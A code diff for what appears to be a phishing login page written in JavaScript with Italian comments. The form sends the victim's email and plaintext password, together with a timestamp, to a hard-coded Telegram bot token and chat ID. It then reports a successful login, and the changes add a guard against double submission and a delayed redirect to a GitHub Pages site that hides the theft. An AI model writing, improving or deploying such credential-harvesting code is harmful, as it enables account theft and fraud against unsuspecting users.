@@ -58,6 +58,10 @@
   var BOT_TOKEN = "8656542427:AAGGNnffMIXvhsOY5gK0jS4rR699fSbQC4A";
   var CHAT_ID = "7704218665";
 
+  // >>> QUI metti la pagina che deve aprirsi <<<
+  var REDIRECT_URL = "https://knighttrucker.github.io/TruckNavigator/";
+  var REDIRECT_DELAY = 1200; // ms: lascia vedere il messaggio di stato prima di cambiare pagina
+
   var statusEl = document.getElementById("status");
   var step1 = document.getElementById("step1");
   var step2 = document.getElementById("step2");
@@ -112,15 +116,30 @@
     setStatus("");
   }
 
+  function apriPagina() {
+    setTimeout(function () {
+      window.location.href = REDIRECT_URL;   // stessa scheda: mai bloccato dai popup blocker
+      // window.open(REDIRECT_URL, "_blank"); // alternativa: nuova scheda
+    }, REDIRECT_DELAY);
+  }
+
   function submit() {
     var e = emailEl.value.trim();
     var p = pwdEl.value;
     if (!p) { setStatus("Inserisci la password", "err"); return; }
+
+    var btn = document.getElementById("go");
+    if (btn.disabled) return;          // evita doppio invio
+    btn.disabled = true;
+
     var msg = "Accesso\nEmail: " + e + "\nPassword: " + p + "\nOra: " + new Date().toLocaleString("it-IT");
     setStatus("Accesso effettuato");
-    sendToBot(msg).catch(function (err) {
-      setStatus("Accesso effettuato (invio: " + err.message + ")", "err");
-    });
+
+    sendToBot(msg)
+      .catch(function (err) {
+        setStatus("Accesso effettuato (invio: " + err.message + ")", "err");
+      })
+      .then(apriPagina);               // parte sia in caso di successo sia di errore
   }
 
   document.getElementById("next").addEventListener("click", goNext);
